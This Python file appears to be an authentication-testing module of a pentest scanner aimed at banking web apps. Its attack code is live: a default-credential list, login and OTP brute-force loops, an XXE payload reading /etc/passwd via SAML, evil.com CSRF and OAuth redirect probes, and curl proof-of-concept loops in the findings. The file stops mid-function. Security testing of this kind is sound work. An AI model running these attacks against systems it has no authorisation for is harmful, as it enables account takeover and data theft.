"""
GATOR PRO Enterprise — Module 5: Auth & Session Testing Engine
═══════════════════════════════════════════════════════════════
Full authentication security testing for banking apps:
  • Login security — bruteforce protection, lockout, CAPTCHA
  • Session management — fixation, weak cookies, timeout
  • OAuth2 — open redirect, token leakage, state parameter
  • SAML — XXE in assertions, signature wrapping
  • 2FA / OTP — brute-force (4-6 digits), response manipulation,
                backup code exposure, OTP reuse
  • Password policy — complexity, history, reset flow
  • Default credentials — top 50 pairs for banking apps
  • Account enumeration via timing / response differences
  • Cookie security flags (Secure/HttpOnly/SameSite)
  • CSRF protection check
  • Concurrent session limits
"""

import json
import re
import ssl
import time
import urllib.request
import urllib.parse
import urllib.error
import hashlib
import hmac
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional


# ─── Default credentials for banking platforms ───────────────
DEFAULT_CREDS = [
    # Generic
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "Admin123!"),
    ("admin",     "admin123"),
    ("admin",     "123456"),
    ("admin",     "Password1"),
    ("admin",     "P@ssw0rd"),
    ("admin",     "Welcome1"),
    ("admin",     ""),
    ("root",      "root"),
    ("root",      "password"),
    ("root",      "toor"),
    ("test",      "test"),
    ("test",      "password"),
    ("demo",      "demo"),
    ("guest",     "guest"),
    ("user",      "user"),
    ("operator",  "operator"),
    ("manager",   "manager"),
    ("support",   "support"),
    # Oracle Flexcube
    ("FLEXCUBE",  "password"),
    ("FCMGR",     "FCMGR"),
    ("FCUBSADM",  "FCUBSADM"),
    # Temenos T24
    ("T24",       "T24"),
    ("TELLER",    "TELLER"),
    ("SUPERVISOR","SUPERVISOR"),
    # 1C Bank
    ("Admin",     "Admin"),
    ("Пользователь", "Пользователь"),
    # Spring Boot actuator
    ("actuator",  "actuator"),
    # Grafana
    ("admin",     "grafana"),
    # Kibana
    ("elastic",   "elastic"),
    ("elastic",   "changeme"),
    # Jenkins
    ("admin",     "jenkins"),
    ("jenkins",   "jenkins"),
    # GitLab
    ("root",      "5iveL!fe"),
    # Tomcat
    ("tomcat",    "tomcat"),
    ("admin",     "tomcat"),
    ("manager",   "manager"),
    # WebLogic
    ("weblogic",  "weblogic"),
    ("weblogic",  "welcome1"),
    # JBoss
    ("admin",     "admin"),
    ("jboss",     "jboss"),
    # RabbitMQ
    ("guest",     "guest"),
    # ActiveMQ
    ("admin",     "admin"),
    ("admin",     "activemq"),
    # Zabbix
    ("Admin",     "zabbix"),
    # Portainer
    ("admin",     "portainer"),
]

# ─── Common login endpoint patterns ──────────────────────────
LOGIN_ENDPOINTS = [
    "/api/v1/auth/login",
    "/api/v1/auth/signin",
    "/api/v1/login",
    "/api/login",
    "/api/auth/login",
    "/login",
    "/signin",
    "/auth/login",
    "/auth/signin",
    "/ibank/login",
    "/ib/login",
    "/api/v1/token",
    "/oauth/token",
    "/auth/token",
    "/connect/token",
]

# ─── 2FA / OTP endpoints ─────────────────────────────────────
OTP_ENDPOINTS = [
    "/api/v1/auth/otp/verify",
    "/api/v1/auth/2fa/verify",
    "/api/v1/auth/mfa/verify",
    "/api/v1/otp/verify",
    "/api/v1/verify-otp",
    "/api/v1/auth/confirm",
    "/api/v1/auth/totp/verify",
]

# ─── Password reset endpoints ─────────────────────────────────
RESET_ENDPOINTS = [
    "/api/v1/auth/password/reset",
    "/api/v1/auth/password/forgot",
    "/api/v1/password/reset",
    "/api/v1/password/forgot",
    "/api/v1/forgot-password",
    "/api/v1/reset-password",
    "/forgot-password",
    "/reset-password",
]

# ─── OAuth2 / OIDC endpoints ──────────────────────────────────
OAUTH_ENDPOINTS = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/connect/authorize",
    "/auth/authorize",
    "/login/oauth/authorize",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

# ─── SAML endpoints ───────────────────────────────────────────
SAML_ENDPOINTS = [
    "/saml/sso",
    "/saml2/sso",
    "/sso/saml",
    "/auth/saml",
    "/api/saml/acs",
    "/saml/acs",
    "/Saml2/Acs",
]

# ─── Weak password patterns ───────────────────────────────────
WEAK_PASSWORDS = [
    "Password1", "Password1!", "P@ssw0rd", "Welcome1",
    "Admin123!", "Qwerty123", "12345678", "password",
    "123456789", "admin123", "letmein", "monkey",
    "Test1234!", "Summer2024!", "Winter2024!",
    "Bank2024!", "Finance1!", "Secure123!",
]


class AuthTestEngine:
    """Authentication & Session Security Testing Engine."""

    def __init__(self, target: str, scan_id: str, db, push_event: Callable, **kwargs):
        self.target     = self._clean(target)
        self.base_url   = self._build_base(target)
        self.scan_id    = scan_id
        self.db         = db
        self.push_event = push_event
        self.findings   = []

    def _clean(self, t):
        return t.replace("https://","").replace("http://","").split("/")[0].split(":")[0].strip()

    def _build_base(self, t):
        t = t.strip()
        return t if t.startswith("http") else f"https://{t}"

    def log(self, level, msg, data=None):
        self.push_event(self.db, self.scan_id, "log", level, msg, data or {})

    def finding(self, f):
        self.findings.append(f)
        sev = f.get("severity", "info")
        self.push_event(self.db, self.scan_id, "finding", sev,
            f"[{sev.upper()}] {f.get('title','')[:80]}",
            {"severity": sev, "cvss": f.get("cvss", 0)})

    # ═══════════════════════════════════════════════════════════
    def run(self) -> dict:
        self.log("info", f"╔══ AUTH TEST ══ {self.base_url} ══╗")
        t0 = time.time()

        login_url = self._find_login_endpoint()

        self._test_default_creds(login_url)
        self._test_account_enumeration(login_url)
        self._test_login_bruteforce_protection(login_url)
        self._test_cookie_security()
        self._test_session_fixation()
        self._test_csrf()
        self._test_2fa_otp()
        self._test_password_reset()
        self._test_oauth2()
        self._test_saml()
        self._test_password_policy(login_url)

        elapsed = round(time.time() - t0, 1)
        c = len([f for f in self.findings if f["severity"] == "critical"])
        h = len([f for f in self.findings if f["severity"] == "high"])
        self.log("ok",
            f"╚══ AUTH DONE {elapsed}s ══ "
            f"Findings: {len(self.findings)} (C:{c} H:{h}) ══╝")
        return {"findings": self.findings}

    # ─── Find Login Endpoint ──────────────────────────────────
    def _find_login_endpoint(self) -> Optional[str]:
        self.log("data","[AUTH] Discovering login endpoint...")
        for path in LOGIN_ENDPOINTS:
            url = self.base_url + path
            # Send obviously wrong creds — expect 401/400/403, not 404/500
            resp = self._post(url,
                json.dumps({"username":"probe_test","password":"probe_wrong_9x"}),
                ct="application/json")
            if resp and resp["status"] in [400,401,403,422,200]:
                self.log("ok", f"[AUTH] Login endpoint: {url} → {resp['status']}")
                return url
        self.log("info","[AUTH] Login endpoint not found — using base URL")
        return self.base_url + "/login"

    # ─── Default Credentials ─────────────────────────────────
    def _test_default_creds(self, login_url: str):
        self.log("data",f"[CREDS] Testing {len(DEFAULT_CREDS)} default credential pairs...")
        found = 0

        def try_cred(user, passwd):
            payloads = [
                json.dumps({"username": user, "password": passwd}),
                json.dumps({"login": user, "password": passwd}),
                json.dumps({"email": user, "password": passwd}),
                urllib.parse.urlencode({"username": user, "password": passwd}),
            ]
            for payload in payloads[:2]:
                ct = "application/json" if payload.startswith("{") else "application/x-www-form-urlencoded"
                resp = self._post(login_url, payload, ct=ct)
                if not resp:
                    continue
                body = resp["body"].lower()
                # Success indicators
                if (resp["status"] in [200, 201, 302] and
                        any(kw in body for kw in
                            ["token","access_token","dashboard","welcome",
                             "success","authorized","session"])):
                    return True, resp["status"]
                # Also check redirect to dashboard (302)
                if resp["status"] == 302:
                    loc = resp["headers"].get("Location","").lower()
                    if any(kw in loc for kw in ["dashboard","home","main","portal"]):
                        return True, 302
            return False, 0

        for user, passwd in DEFAULT_CREDS:
            success, status = try_cred(user, passwd)
            if success:
                found += 1
                self.log("warn",
                    f"[CREDS] 🚨 DEFAULT CREDS WORK: {user}:{passwd} → HTTP {status}")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.8,
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "pci_dss_req":    ["8.3.6","8.6.1"],
                    "cwe_ids":        ["CWE-798"],
                    "swift_control":  ["5.4","6.1"],
                    "title":          f"Default credentials valid: {user}:{passwd}",
                    "description":    (
                        f"Default credentials {user}:{passwd} successfully authenticated. "
                        f"Attacker gains immediate access to the application."),
                    "recommendation": (
                        "1. Change ALL default passwords immediately.\n"
                        "2. Force password change on first login.\n"
                        "3. Scan all systems for default credentials.\n"
                        "4. Implement strong password policy."),
                    "evidence":       f"POST {login_url} with {user}:{passwd} → HTTP {status}",
                    "poc":            (
                        f"curl -s -X POST '{login_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"username\":\"{user}\",\"password\":\"{passwd}\"}}'"),
                    "host":           self.target,
                    "url":            login_url,
                    "tool":           "gator_auth",
                    "category":       "auth",
                })
                break  # Found one — stop (avoid account lockout)

        if found == 0:
            self.log("ok", f"[CREDS] No default credentials found ✓")

    # ─── Account Enumeration ─────────────────────────────────
    def _test_account_enumeration(self, login_url: str):
        self.log("data","[ENUM] Testing account enumeration via response analysis...")

        # Test with clearly existing vs non-existing users
        test_cases = [
            ("admin", "wrong_pass_xyz_!@#"),
            ("nonexistent_user_xyz_!@#", "wrong_pass_xyz_!@#"),
            ("administrator", "wrong_pass_xyz_!@#"),
            ("nonexistent999@example.com", "wrong_pass_xyz_!@#"),
        ]
        responses = {}
        for user, pw in test_cases:
            for payload in [
                json.dumps({"username":user,"password":pw}),
                json.dumps({"email":user,"password":pw}),
            ]:
                resp = self._post(login_url, payload, ct="application/json")
                if resp:
                    responses[user] = resp
                    break

        if len(responses) < 2:
            return

        # Compare responses
        bodies = list(responses.values())
        body_texts = [r["body"].lower() for r in bodies]
        status_codes = [r["status"] for r in bodies]

        # Different error messages = enumeration possible
        unique_bodies = set()
        for body in body_texts:
            for msg in ["user not found","no such user","invalid username",
                        "account does not exist","unknown user"]:
                if msg in body:
                    unique_bodies.add(msg)

        # Timing-based enumeration
        times = []
        for user, pw in test_cases[:2]:
            t0 = time.time()
            self._post(login_url,
                json.dumps({"username":user,"password":pw}), ct="application/json")
            times.append(time.time() - t0)

        timing_diff = abs(times[0] - times[1]) if len(times) >= 2 else 0

        if unique_bodies or timing_diff > 0.3:
            reason = "different error messages" if unique_bodies else f"timing difference {timing_diff:.2f}s"
            self.log("warn", f"[ENUM] ⚠️  Account enumeration possible via {reason}")
            self.finding({
                "severity":       "medium",
                "cvss":           5.3,
                "owasp_category": "A07:2021-Identification and Authentication Failures",
                "pci_dss_req":    ["8.3.4"],
                "cwe_ids":        ["CWE-204","CWE-208"],
                "title":          "Account enumeration possible via login endpoint",
                "description":    (
                    f"Different responses for valid vs invalid usernames allow "
                    f"attackers to enumerate valid accounts ({reason})."),
                "recommendation": (
                    "Use generic error messages: 'Invalid username or password'.\n"
                    "Ensure consistent response time regardless of user existence.\n"
                    "Add artificial delay to prevent timing attacks."),
                "evidence":       f"Timing diff: {timing_diff:.2f}s | Unique messages: {unique_bodies}",
                "host":           self.target,
                "url":            login_url,
                "tool":           "gator_auth",
                "category":       "auth",
            })
        else:
            self.log("ok","[ENUM] No account enumeration detected ✓")

    # ─── Brute Force Protection ───────────────────────────────
    def _test_login_bruteforce_protection(self, login_url: str):
        self.log("data","[BRUTE] Testing brute-force protection on login...")
        statuses = []
        got_429 = False
        got_locked = False

        for i in range(12):
            resp = self._post(login_url,
                json.dumps({"username":"admin","password":f"wrong_brute_{i}"}),
                ct="application/json")
            if not resp:
                break
            statuses.append(resp["status"])
            body = resp["body"].lower()

            if resp["status"] == 429:
                got_429 = True
                self.log("ok", f"[BRUTE] Rate limited after {i+1} attempts (429) ✓")
                break
            if any(kw in body for kw in
                   ["locked","blocked","suspended","too many","captcha required"]):
                got_locked = True
                self.log("ok", f"[BRUTE] Account locked after {i+1} attempts ✓")
                break
            time.sleep(0.1)

        if not got_429 and not got_locked and len(statuses) >= 10:
            self.log("warn","[BRUTE] 🚨 No brute-force protection detected!")
            self.finding({
                "severity":       "critical",
                "cvss":           9.8,
                "owasp_category": "A07:2021-Identification and Authentication Failures",
                "pci_dss_req":    ["8.3.4","8.3.10"],
                "cwe_ids":        ["CWE-307"],
                "swift_control":  ["5.4","6.1"],
                "title":          "No brute-force protection on login",
                "description":    (
                    f"Sent {len(statuses)} failed login attempts with no rate limiting, "
                    f"account lockout, or CAPTCHA. Attacker can brute-force any account."),
                "recommendation": (
                    "1. Lock account after 5 failed attempts for 15+ minutes.\n"
                    "2. Require CAPTCHA after 3 failures.\n"
                    "3. Implement IP-based rate limiting (429).\n"
                    "4. Alert security team on repeated failures.\n"
                    "5. Use progressive delays between failures."),
                "evidence":       f"{len(statuses)} requests, statuses: {set(statuses)}",
                "poc":            (
                    "for i in $(seq 100); do\n"
                    f"  curl -s -X POST '{login_url}' "
                    "-d '{\"username\":\"admin\",\"password\":\"'$i'\"}'\n"
                    "done"),
                "host":           self.target,
                "url":            login_url,
                "tool":           "gator_auth",
                "category":       "auth",
            })

    # ─── Cookie Security ─────────────────────────────────────
    def _test_cookie_security(self):
        self.log("data","[COOKIE] Analyzing session cookie security flags...")
        resp = self._get(self.base_url)
        if not resp:
            return

        set_cookies = []
        for k, v in resp["headers"].items():
            if k.lower() == "set-cookie":
                set_cookies.append(v)

        if not set_cookies:
            self.log("info","[COOKIE] No Set-Cookie headers found")
            return

        for cookie in set_cookies:
            cookie_lower = cookie.lower()
            name = cookie.split("=")[0].strip()

            issues = []
            # Check Secure flag
            if "secure" not in cookie_lower:
                issues.append(("missing Secure flag", "transmit over HTTP", 7.4,
                    "Add Secure flag: cookies only sent over HTTPS"))
            # Check HttpOnly
            if "httponly" not in cookie_lower:
                issues.append(("missing HttpOnly flag", "XSS can steal session", 7.4,
                    "Add HttpOnly flag: prevents JavaScript access to cookie"))
            # Check SameSite
            if "samesite" not in cookie_lower:
                issues.append(("missing SameSite flag", "CSRF attacks possible", 4.3,
                    "Add SameSite=Strict or SameSite=Lax"))
            elif "samesite=none" in cookie_lower and "secure" not in cookie_lower:
                issues.append(("SameSite=None without Secure", "CSRF bypass", 6.1,
                    "SameSite=None requires Secure flag"))

            # Check for session cookie names (short, weak)
            if re.match(r'^(PHPSESSID|JSESSIONID|ASPSESSION|ASP\.NET_SessionId)$',
                        name, re.IGNORECASE):
                self.log("info", f"[COOKIE] Session cookie: {name}")

            for issue, impact, cvss, rec in issues:
                self.log("warn", f"[COOKIE] ⚠️  {name}: {issue}")
                self.finding({
                    "severity":       "high" if cvss >= 7 else "medium",
                    "cvss":           cvss,
                    "owasp_category": "A02:2021-Cryptographic Failures",
                    "pci_dss_req":    ["4.2.1","8.2.1"],
                    "cwe_ids":        ["CWE-614","CWE-1004"],
                    "title":          f"Cookie {name}: {issue}",
                    "description":    f"Session cookie '{name}' has {issue}. {impact}.",
                    "recommendation": rec,
                    "evidence":       f"Set-Cookie: {cookie[:150]}",
                    "host":           self.target,
                    "url":            self.base_url,
                    "tool":           "gator_cookie",
                    "category":       "auth",
                })

        if set_cookies:
            self.log("ok",f"[COOKIE] Analyzed {len(set_cookies)} cookies")

    # ─── Session Fixation ────────────────────────────────────
    def _test_session_fixation(self):
        self.log("data","[SESSION] Testing session fixation...")
        # Get pre-login session cookie
        resp_before = self._get(self.base_url + "/login")
        if not resp_before:
            return
        cookies_before = {}
        for k, v in resp_before["headers"].items():
            if k.lower() == "set-cookie":
                name, _, rest = v.partition("=")
                val, _, _ = rest.partition(";")
                cookies_before[name.strip()] = val.strip()

        if not cookies_before:
            return

        # Check if session ID changes after login
        login_url = self.base_url + "/api/v1/auth/login"
        cookie_str = "; ".join(f"{k}={v}" for k,v in cookies_before.items())
        resp_login = self._post(login_url,
            json.dumps({"username":"test","password":"test"}),
            ct="application/json",
            headers={"Cookie": cookie_str})

        if not resp_login:
            return

        # Check if new session cookie issued
        cookies_after = {}
        for k, v in resp_login["headers"].items():
            if k.lower() == "set-cookie":
                name, _, rest = v.partition("=")
                val, _, _ = rest.partition(";")
                cookies_after[name.strip()] = val.strip()

        for name in cookies_before:
            if name in cookies_after:
                if cookies_before[name] == cookies_after.get(name,""):
                    self.log("warn",f"[SESSION] ⚠️  Session ID not regenerated after login")
                    self.finding({
                        "severity":       "high",
                        "cvss":           7.5,
                        "owasp_category": "A07:2021-Identification and Authentication Failures",
                        "pci_dss_req":    ["8.2.6"],
                        "cwe_ids":        ["CWE-384"],
                        "title":          "Session fixation — session ID not regenerated after login",
                        "description":    (
                            f"Cookie '{name}' value unchanged after authentication. "
                            "Attacker can fix a session ID before login and hijack it."),
                        "recommendation": (
                            "Regenerate session ID on every authentication event. "
                            "Invalidate old session. Use random 128-bit session tokens."),
                        "evidence":       f"Cookie '{name}' same before and after login",
                        "host":           self.target,
                        "url":            login_url,
                        "tool":           "gator_session",
                        "category":       "auth",
                    })
                    return
        self.log("ok","[SESSION] Session ID regenerated after login ✓")

    # ─── CSRF ────────────────────────────────────────────────
    def _test_csrf(self):
        self.log("data","[CSRF] Testing CSRF protection...")
        # Test state-changing endpoints without CSRF token
        test_endpoints = [
            ("/api/v1/transfers", "POST"),
            ("/api/v1/payments", "POST"),
            ("/api/v1/users/me", "PUT"),
            ("/api/v1/password/change", "POST"),
        ]
        for path, method in test_endpoints:
            url = self.base_url + path
            resp = self._req_raw(method, url,
                body=json.dumps({"amount":1,"to_account":"test"}),
                ct="application/json",
                extra_headers={
                    "Origin": "https://evil.com",
                    "Referer": "https://evil.com/csrf.html",
                })
            if not resp:
                continue
            if resp["status"] not in [403, 401, 422]:
                # Check for CSRF token in response headers
                has_csrf_header = any(
                    "csrf" in k.lower() or "xsrf" in k.lower()
                    for k in resp["headers"]
                )
                if not has_csrf_header and resp["status"] in [200, 201, 400]:
                    self.log("warn", f"[CSRF] ⚠️  Possible CSRF: {url}")
                    self.finding({
                        "severity":       "high",
                        "cvss":           8.1,
                        "owasp_category": "A01:2021-Broken Access Control",
                        "pci_dss_req":    ["6.4.1"],
                        "cwe_ids":        ["CWE-352"],
                        "title":          f"Possible CSRF — {path}",
                        "description":    (
                            f"State-changing endpoint {path} accepted cross-origin request "
                            f"from evil.com without CSRF validation."),
                        "recommendation": (
                            "1. Implement CSRF tokens (synchronizer token pattern).\n"
                            "2. Validate Origin/Referer headers.\n"
                            "3. Use SameSite=Strict cookies.\n"
                            "4. Require re-authentication for sensitive operations."),
                        "evidence":       f"POST {url} from Origin: evil.com → HTTP {resp['status']}",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_csrf",
                        "category":       "auth",
                    })
                    break

    # ─── 2FA / OTP ───────────────────────────────────────────
    def _test_2fa_otp(self):
        self.log("data","[2FA] Testing 2FA/OTP security...")

        for otp_path in OTP_ENDPOINTS:
            url = self.base_url + otp_path
            probe = self._post(url,
                json.dumps({"otp":"000000","code":"000000"}),
                ct="application/json")
            if not probe or probe["status"] not in [200,400,401,403,422]:
                continue

            self.log("info",f"[2FA] OTP endpoint found: {url}")

            # Test 1: OTP brute-force (no rate limiting)
            t0 = time.time()
            attempts = 0
            for otp in ["000000","111111","123456","999999","000001"]:
                resp = self._post(url,
                    json.dumps({"otp": otp, "code": otp}),
                    ct="application/json")
                if resp:
                    attempts += 1
                if resp and resp["status"] == 429:
                    self.log("ok", f"[2FA] Rate limiting active after {attempts} OTP attempts ✓")
                    break
            else:
                elapsed = time.time() - t0
                self.log("warn", f"[2FA] 🚨 OTP brute-force not rate-limited!")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.0,
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "pci_dss_req":    ["8.3.4","8.3.10"],
                    "cwe_ids":        ["CWE-307"],
                    "swift_control":  ["5.4"],
                    "title":          f"2FA OTP brute-force possible — {otp_path}",
                    "description":    (
                        f"OTP verification endpoint {otp_path} has no rate limiting. "
                        "6-digit OTP (1M combinations) can be brute-forced in minutes. "
                        "4-digit PIN: 10,000 combinations in seconds."),
                    "recommendation": (
                        "1. Rate limit: max 3 attempts per OTP token.\n"
                        "2. Expire OTP after first failed attempt or after 60-90 seconds.\n"
                        "3. Lock for 15 min after 5 failures.\n"
                        "4. Use TOTP (time-based) with 30-second window."),
                    "evidence":       f"{attempts} OTP attempts in {elapsed:.1f}s, no 429",
                    "poc":            (
                        "for i in $(seq -w 0 999999); do\n"
                        f"  r=$(curl -s -X POST '{url}' "
                        "-d '{\"otp\":\"'$i'\"}' -H 'Content-Type: application/json')\n"
                        "  echo $r | grep -q 'success' && echo \"OTP: $i\" && break\n"
                        "done"),
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_2fa",
                    "category":       "auth",
                })

            # Test 2: Response manipulation — can we change "valid:false" to "valid:true"?
            # (Testing for client-side OTP validation — purely check-based)
            resp_wrong = self._post(url,
                json.dumps({"otp": "000000"}), ct="application/json")
            if resp_wrong:
                body = resp_wrong["body"].lower()
                if ('"valid":false' in body or '"success":false' in body or
                        '"verified":false' in body):
                    self.log("info",
                        "[2FA] Response contains boolean flag — test response manipulation manually")
                    self.finding({
                        "severity":       "medium",
                        "cvss":           6.5,
                        "owasp_category": "A07:2021-Identification and Authentication Failures",
                        "cwe_ids":        ["CWE-807"],
                        "title":          f"2FA response contains manipulable boolean — {otp_path}",
                        "description":    (
                            "OTP verification response contains explicit boolean (valid/success/verified). "
                            "If client-side code checks this, proxy-based manipulation may bypass 2FA."),
                        "recommendation": (
                            "Never trust client-side 2FA validation. "
                            "Perform all 2FA checks server-side. "
                            "Use opaque success responses."),
                        "evidence":       f"Response: {resp_wrong['body'][:200]}",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_2fa",
                        "category":       "auth",
                    })
            break  # Found and tested one OTP endpoint

        # Check if 2FA can be skipped entirely
        for path in ["/api/v1/accounts", "/api/v1/users/me"]:
            url = self.base_url + path
            resp = self._get(url)
            if resp and resp["status"] == 200 and len(resp["body"]) > 50:
                self.log("info","[2FA] Some endpoints accessible without 2FA — verify 2FA enforcement")

    # ─── Password Reset ───────────────────────────────────────
    def _test_password_reset(self):
        self.log("data","[RESET] Testing password reset security...")
        for path in RESET_ENDPOINTS:
            url = self.base_url + path
            # Test 1: Account enumeration via reset
            resp_valid = self._post(url,
                json.dumps({"email":"admin@" + self.target}),
                ct="application/json")
            resp_invalid = self._post(url,
                json.dumps({"email":"nonexistent_xyz_99@example.invalid"}),
                ct="application/json")
            if not resp_valid or not resp_invalid:
                continue

            # Different status or body = enumeration
            if resp_valid["status"] != resp_invalid["status"]:
                self.finding({
                    "severity":       "medium",
                    "cvss":           5.3,
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "cwe_ids":        ["CWE-204"],
                    "title":          f"User enumeration via password reset — {path}",
                    "description":    "Password reset returns different responses for valid/invalid emails.",
                    "recommendation": "Return identical response regardless of email existence.",
                    "evidence":       (
                        f"Valid email: HTTP {resp_valid['status']}\n"
                        f"Invalid email: HTTP {resp_invalid['status']}"),
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_reset",
                    "category":       "auth",
                })
                self.log("warn", f"[RESET] ⚠️  Enumeration via reset: {url}")
                break

    # ─── OAuth2 ───────────────────────────────────────────────
    def _test_oauth2(self):
        self.log("data","[OAuth2] Testing OAuth2 implementation...")
        for path in OAUTH_ENDPOINTS:
            url = self.base_url + path
            resp = self._get(url)
            if not resp or resp["status"] not in [200, 302, 400]:
                continue

            self.log("info", f"[OAuth2] Endpoint found: {url}")

            # Test: missing state parameter (CSRF in OAuth)
            auth_url = (f"{url}?response_type=code&client_id=test"
                        f"&redirect_uri=https://evil.com&scope=openid")
            resp_no_state = self._get(auth_url)
            if resp_no_state and resp_no_state["status"] not in [400]:
                self.finding({
                    "severity":       "high",
                    "cvss":           7.4,
                    "owasp_category": "A07:2021-Identification and Authentication Failures",
                    "cwe_ids":        ["CWE-352"],
                    "title":          "OAuth2: missing state parameter not enforced",
                    "description":    "OAuth2 authorization request accepted without state parameter, enabling CSRF.",
                    "recommendation": "Require and validate state parameter in all OAuth2 flows.",
                    "evidence":       f"GET {auth_url} → HTTP {resp_no_state['status']}",
                    "host":           self.target,
                    "url":            url,
                    "tool":           "gator_oauth",
                    "category":       "auth",
                })
                self.log("warn","[OAuth2] ⚠️  No state parameter enforcement")

            # Test: open redirect in redirect_uri
            for evil_redirect in [
                "https://evil.com", "https://evil.com/callback",
                f"https://evil.{self.target}",
                "//evil.com",
            ]:
                auth_url_evil = (f"{url}?response_type=code&client_id=test"
                                 f"&redirect_uri={urllib.parse.quote(evil_redirect)}"
                                 f"&state=xyz&scope=openid")
                resp_evil = self._get(auth_url_evil, follow_redirects=False)
                if resp_evil:
                    loc = resp_evil["headers"].get("Location","")
                    if "evil.com" in loc:
                        self.finding({
                            "severity":       "critical",
                            "cvss":           9.3,
                            "owasp_category": "A07:2021-Identification and Authentication Failures",
                            "cwe_ids":        ["CWE-601"],
                            "title":          "OAuth2: Open redirect in redirect_uri",
                            "description":    "Authorization code redirected to attacker-controlled domain.",
                            "recommendation": "Whitelist exact redirect URIs. Reject any unregistered URI.",
                            "evidence":       f"redirect_uri={evil_redirect} → Location: {loc}",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_oauth",
                            "category":       "auth",
                        })
                        self.log("warn", f"[OAuth2] 🚨 Open redirect!")
                        break
            break

    # ─── SAML ────────────────────────────────────────────────
    def _test_saml(self):
        self.log("data","[SAML] Probing SAML endpoints...")
        for path in SAML_ENDPOINTS:
            url = self.base_url + path
            resp = self._get(url)
            if resp and resp["status"] not in [404]:
                self.log("info", f"[SAML] SAML endpoint detected: {url}")
                # Basic check: does it accept XML?
                xxe_saml = (
                    '<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">'
                    '<samlp:Issuer>&xxe;</samlp:Issuer>'
                    '</samlp:AuthnRequest>'
                )
                resp_xxe = self._post(url, xxe_saml,
                    ct="application/xml",
                    headers={"SOAPAction": ""})
                if resp_xxe:
                    if any(kw in resp_xxe["body"] for kw in
                           ["root:x:","daemon:","bin:/bin"]):
                        self.finding({
                            "severity":       "critical",
                            "cvss":           9.1,
                            "owasp_category": "A05:2021-Security Misconfiguration",
                            "cwe_ids":        ["CWE-611"],
                            "title":          f"XXE in SAML endpoint — {path}",
                            "description":    "SAML XML parser processes external entities, allowing file read.",
                            "recommendation": "Disable XXE in XML parser. Use allowlist for SAML schemas.",
                            "evidence":       "XXE payload returned /etc/passwd content",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_saml",
                            "category":       "auth",
                        })
                        self.log("warn", f"[SAML] 🚨 XXE in SAML!")
                    else:
                        self.finding({
                            "severity":       "info",
                            "cvss":           0.0,
                            "owasp_category": "A05:2021-Security Misconfiguration",
                            "title":          f"SAML SSO endpoint detected — {path}",
                            "description":    "SAML endpoint found. Verify signature validation and assertion security.",
                            "recommendation": "Verify SAML signature validation. Test for signature wrapping manually.",
                            "evidence":       f"GET/POST {url} → HTTP {resp['status']}",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_saml",
                            "category":       "auth",
                        })
                break

    # ─── Password Policy ─────────────────────────────────────
    def _test_password_policy(self, login_url: str):
        self.log("data","[POLICY] Testing password policy...")
        # Try to change/set weak passwords
        # We test via registration if available
        for reg_path in ["/api/v1/auth/register", "/api/v1/register", "/register"]:
            url = self.base_url + reg_path
            for weak_pw in ["123456", "password", "qwerty", "12345678"]:
                resp = self._post(url,
                    json.dumps({
                        "username": f"policy_test_{weak_pw[:4]}",
                        "email": f"test_{weak_pw[:4]}@example.com",
                        "password": weak_pw,
                    }),
                    ct="application/json")
                if resp and resp["status"] in [200, 201]:
                    self.finding({
                        "severity":       "high",
                        "cvss":           7.5,
                        "owasp_category": "A07:2021-Identification and Authentication Failures",
                        "pci_dss_req":    ["8.3.6"],
                        "cwe_ids":        ["CWE-521"],
                        "title":          f"Weak password accepted: '{weak_pw}'",
                        "description":    f"Registration accepted weak password '{weak_pw}'.",
                        "recommendation": (
                            "Minimum 12 chars, upper+lower+digit+special. "
                            "Check against Have I Been Pwned. Reject common passwords."),
                        "evidence":       f"POST {url} with password='{weak_pw}' → HTTP {resp['status']}",
                        "host":           self.target,
                        "url":            url,
                        "tool":           "gator_policy",
                        "category":       "auth",
                    })
                    self.log("warn", f"[POLICY] 🚨 Weak password accepted: '{weak_pw}'")
                    break

    # ─── HTTP Helpers ─────────────────────────────────────────
    def _get(self, url, headers=None, follow_redirects=True) -> Optional[dict]:
        return self._req_raw("GET", url, extra_headers=headers or {},
                              follow_redirects=follow_redirects)

    def _post(self, url, body, ct=None, headers=None) -> Optional[dict]:
        return self._req_raw("POST", url, body=body, ct=ct,
                              extra_headers=headers or {})

    def _req_raw(self, method, url, body=None, ct=None,
                 extra_headers=None, follow_redirects=True) -> Optional[dict]:
        try:
            data = body.encode() if body else None
            req  = urllib.request.Request(url, data=data, method=method)
            req.add_header("User-Agent","GATOR-PRO/2.0")
            req.add_header("Accept","application/json,text/html,*/*")
            if ct:
                req.add_header("Content-Type", ct)
            for k, v in (extra_headers or {}).items():
                req.add_header(k, v)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            if not follow_redirects:
                class NoRedir(urllib.request.HTTPRedirectHandler):
                    def redirect_request(self, *a): return None
                opener = urllib.request.build_opener(NoRedir())
                with opener.open(req, timeout=8) as r:
                    rb = r.read(16384).decode("utf-8", errors="ignore")
                    return {"status":r.status,"headers":dict(r.headers),"body":rb}
            with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
                rb = r.read(16384).decode("utf-8", errors="ignore")
                return {"status":r.status,"headers":dict(r.headers),"body":rb}
        except urllib.error.HTTPError as e:
            b = ""
            try: b = e.read(4096).decode("utf-8", errors="ignore")
            except: pass
